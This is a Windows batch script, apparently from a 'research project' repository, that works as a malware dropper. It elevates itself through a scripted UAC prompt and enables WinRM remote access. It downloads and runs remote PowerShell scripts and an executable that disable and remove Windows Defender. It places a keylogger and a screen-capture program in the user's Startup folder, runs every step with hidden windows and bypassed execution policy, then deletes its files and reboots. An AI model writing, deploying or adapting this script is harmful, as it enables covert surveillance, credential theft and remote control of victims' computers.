@echo off
:: BatchGotAdmin

IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if errorlevel 1 (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
echo Set UAC=CreateObject("Shell.Application") > "%temp%\getadmin.vbs"
set params=%*
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /B

:gotAdmin
cd /d "%~dp0"

@REM Enable WIN-RM
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
    "try { winrm quickconfig -quiet; Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop } catch { Write-Output 'WinRM already configured or failed'; Start-Sleep -Seconds 3 }"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1' -OutFile disableWinDef.ps1"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "disableWinDef.ps1"
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/installer.ps1' -OutFile installer.ps1"
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe' -OutFile defender_remover.exe"
powershell -WindowStyle Hidden  -ExecutionPolicy Bypass -File "installer.ps1"
defender_remover.exe Y

@REM Download and execute keylogger


powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/keylogger.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe\""
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/raw/refs/heads/main/Original/Resources/Screenwatch.exe' -OutFile \"C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Screenwatch.exe\""

winget install Python.Python.3.13 --source winget --silent --accept-package-agreements --accept-source-agreements 

timeout /t 120

del defender_remover.exe
del installer.ps1

shutdown /r
del wget.cmd


